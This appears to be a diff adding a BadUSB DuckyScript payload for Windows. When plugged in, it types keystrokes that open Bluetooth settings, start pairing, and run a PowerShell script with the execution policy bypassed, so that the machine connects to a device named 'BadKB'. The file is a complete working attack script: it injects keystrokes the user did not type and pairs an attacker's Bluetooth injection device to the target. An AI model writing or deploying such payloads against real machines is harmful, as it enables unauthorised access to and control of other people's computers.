@@ -1,0 +1,21 @@
+REM BadUSB script to open Bluetooth add device dialog and run PowerShell script to select/connect to device starting with "BadKB"
+REM Assumes Windows OS, target device discoverable/in pairing mode, and PowerShell script in same directory
+REM Opens Bluetooth settings, initiates add device, then runs PowerShell for precise selection
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING ms-settings:bluetooth
+ENTER
+DELAY 3000  REM Wait for Bluetooth settings to open
+TAB
+TAB
+TAB  REM Navigate to "Add Bluetooth or other device" button (adjust TAB count if needed)
+ENTER
+DELAY 1000
+ENTER  REM Select "Bluetooth" in the add device dialog
+DELAY 5000  REM Wait for device list to load
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -File "%USERPROFILE%\Desktop\Nuova cartella\bluetooth_select.ps1"
+ENTER
